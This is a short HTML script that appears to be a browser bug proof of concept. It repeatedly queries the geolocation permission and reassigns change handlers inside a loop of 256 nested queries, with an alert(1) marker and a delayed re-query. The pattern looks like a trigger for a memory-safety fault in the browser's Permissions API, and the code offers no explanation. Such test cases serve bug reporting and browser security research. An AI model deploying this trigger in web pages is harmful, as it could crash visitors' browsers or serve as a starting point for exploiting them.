<script>

navigator.permissions.query({ name: 'geolocation' }).then((result) => {
    let count = 0;
 result.onchange = () => {
    if (count++ == 0) {
        for(var i=0; i <0x100; i++) {
            navigator.permissions.query({ name: 'geolocation' }).then(() => {
                result.onchange = () => {
                    alert(1);
                    navigator.permissions.query({ name: 'geolocation' }).then(()=>{});
                }
            });
        }
    }
 }

 setTimeout(()=>{
    navigator.permissions.query({ name: 'geolocation' }).then(()=>{});
 }, 3000);


});
</script>